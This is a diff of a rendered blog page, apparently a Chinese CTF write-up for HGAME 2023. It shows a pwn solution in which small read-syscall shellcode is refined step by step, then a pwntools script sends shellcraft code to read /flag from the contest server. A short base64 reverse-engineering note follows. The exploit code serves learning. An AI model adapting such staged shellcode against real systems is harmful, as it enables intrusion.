 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov rax,0</span></span><br><span class="line"><span class="string">mov rsi,0xCAFE0010</span></span><br><span class="line"><span class="string">mov rdi,0</span></span><br><span class="line"><span class="string">mov rdx,0x1000</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
 
-<p><img data-src="/./../images/image-20230116111442132.png" alt="image-20230116111442132"></p>
+<p><img src="/./../images/image-20230116111442132.png" alt="image-20230116111442132"></p>
 <p>然后只能全部改成edi这种32位寄存器的形式了</p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov eax,0</span></span><br><span class="line"><span class="string">mov esi,0xCAFE0010</span></span><br><span class="line"><span class="string">mov edi,0</span></span><br><span class="line"><span class="string">mov edx,0x1000</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
 
 <p>但是还是不行</p>
-<p><img data-src="/./../images/image-20230116111621791.png" alt="image-20230116111621791"></p>
+<p><img src="/./../images/image-20230116111621791.png" alt="image-20230116111621791"></p>
 <p>把mov 0的操作全部换成xor，就对了</p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">mov esi,0xCAFE0010</span></span><br><span class="line"><span class="string">xor edi,edi</span></span><br><span class="line"><span class="string">mov edx,0x1000</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
 
-<p><img data-src="/./../images/image-20230116112543060.png" alt="image-20230116112543060"></p>
+<p><img src="/./../images/image-20230116112543060.png" alt="image-20230116112543060"></p>
 <p>这里要调用read，就要涉及系统调用号：</p>
 <p>在汇编程序中使用Linux系统调用。 您需要采取以下步骤在程序中使用Linux系统调用 </p>
 <ul>
@@ -486,126 +909,202 @@
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;week-1.hgame.lwsec.cn&#x27;</span>,<span class="number">30105</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">mov esi,0xCAFE0010</span></span><br><span class="line"><span class="string">xor edi,edi</span></span><br><span class="line"><span class="string">mov edx,0x1000</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;len:&#x27;</span>,<span class="built_in">len</span>(shellcode))</span><br><span class="line">io.sendafter(<span class="string">&#x27;shellcode:\n&#x27;</span>,shellcode)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = b&#x27;\x90&#x27; * 0x10</span></span><br><span class="line">payload = asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>))</span><br><span class="line">payload += asm(shellcraft.read(<span class="number">3</span>,<span class="number">0xcafe0500</span>,<span class="number">0x100</span>))</span><br><span class="line">payload += asm(shellcraft.write(<span class="number">1</span>,<span class="number">0xcafe0500</span>,<span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>结果：</p>
-<p><img data-src="/./../images/image-20230116113635529.png" alt="image-20230116113635529"></p>
+<p><img src="/./../images/image-20230116113635529.png" alt="image-20230116113635529"></p>
 <hr>
 <h1 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h1><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="before-main"><a href="#before-main" class="headerlink" title="before_main"></a>before_main</h3><p>题中 __attribute__属性修饰函数，参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/xiao__1bai/article/details/124156235">(61条消息) 浅析逆向中 gcc 在主函数前后运行的函数_沐一 · 林的博客-CSDN博客_逆向 init</a></p>
 <p>该题考查base64，换表函数定义了__ attribute__ ((constructor))会使函数在 main() 函数之前被执行</p>
-<p>这里ptrace检测反调试，即出现反调试就不进行换表操作<img data-src="/./../images/image-20230214103452756.png" alt="image-20230214103452756"></p>
+<p>这里ptrace检测反调试，即出现反调试就不进行换表操作<img src="/./../images/image-20230214103452756.png" alt="image-20230214103452756"></p>
 <p>自己手动换表后用cyberchef解base64即可</p>
 <hr>
 <h1 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h1><h2 id="re-1"><a href="#re-1" class="headerlink" title="re"></a>re</h2>
-    </div>
-
-    
-    
-    
       
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 jaytp@qq.com </span>
+    </div>
+</article>
 
 
-    <footer class="post-footer">
-          <div class="reward-container">
-  <div>你的资助更能使我继续创作！！！</div>
-  <button>
-    赞赏
-  </button>
-  <div class="post-reward">
-      <div>
-        <img src="/images/wechatpay.jpg" alt="Pa1r0t_9e 微信">
-        <span>微信</span>
-      </div>
-      <div>
-        <img src="/images/alipay.png" alt="Pa1r0t_9e 支付宝">
-        <span>支付宝</span>
-      </div>
-
-  </div>
-</div>
-
-          
-
-<div class="post-copyright">
-<ul>
-  <li class="post-copyright-author">
-      <strong>本文作者： </strong>Pa1r0t_9e
-  </li>
-  <li class="post-copyright-link">
-      <strong>本文链接：</strong>
-      <a href="https://pa1r0t.github.io/2023/01/14/hgame2023/" title="hgame2023">https://pa1r0t.github.io/2023/01/14/hgame2023/</a>
-  </li>
-  <li class="post-copyright-license">
-    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
-  </li>
-</ul>
-</div>
-
-
-        
-
-          <div class="post-nav">
-            <div class="post-nav-item">
-                <a href="/2023/01/13/pwn-practice1/" rel="prev" title="pwn_practice1">
-                  <i class="fa fa-chevron-left"></i> pwn_practice1
-                </a>
-            </div>
-            <div class="post-nav-item">
-                <a href="/2023/01/19/IDAPython/" rel="next" title="IDAPython">
-                  IDAPython <i class="fa fa-chevron-right"></i>
-                </a>
-            </div>
-          </div>
-    </footer>
-  </article>
-</div>
+<p>
+    <a  class="dashang" onclick="dashangToggle()">赏</a>
+</p>
 
 
 
 
 
 
-</div>
-  </main>
-
-  <footer class="footer">
-    <div class="footer-inner">
+    
 
 
-<div class="copyright">
-  &copy; 
-  <span itemprop="copyrightYear">2023</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">Pa1r0t_9e</span>
-</div>
-<!--
-  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
-  </div>
--->
+
 
     </div>
-  </footer>
+    <div class="copyright">
+        <p class="footer-entry">
+    ©2016-2020 Yelog
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
 
-  
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha256-yt2kYMy0w8AbtF89WXb2P1rfjcP/HTHLT7097U8Y5b8=" crossorigin="anonymous"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
-<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
 
-  
-<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
-<script src="/js/third-party/search/local-search.js"></script>
+    </div>
+</div>
 
-
-
-  <script src="/js/third-party/fancybox.js"></script>
-
-
-  
-
-
-
+<div class="hide_box" onclick="dashangToggle()"></div>
+<div class="shang_box">
+    <a class="shang_close"  onclick="dashangToggle()">×</a>
+    <div class="shang_tit">
+        <p>喜欢就点赞,疼爱就打赏</p>
+    </div>
+    <div class="shang_payimg">
+        <div class="pay_img">
+            <img src="/img/alipay.jpg" class="alipay" title="扫码支持">
+            <img src="/img/weixin.jpg" class="weixin" title="扫码支持">
+        </div>
+    </div>
+    <div class="shang_payselect">
+        <span><label><input type="radio" name="pay" checked value="alipay">支付宝</label></span><span><label><input type="radio" name="pay" value="weixin">微信</label></span>
+    </div>
+</div>
 
 
 </body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+        $("input[name=pay]").on("click", function () {
+            if($("input[name=pay]:checked").val()=="weixin"){
+                $(".shang_box .shang_payimg .pay_img").addClass("weixin_img");
+            } else {
+                $(".shang_box .shang_payimg .pay_img").removeClass("weixin_img");
+            }
+        })
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+    function dashangToggle() {
+        $(".shang_box").fadeToggle();
+        $(".hide_box").fadeToggle();
+    }
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+
+    
+</style>
+
+
+
+
+
+
+
 </html>
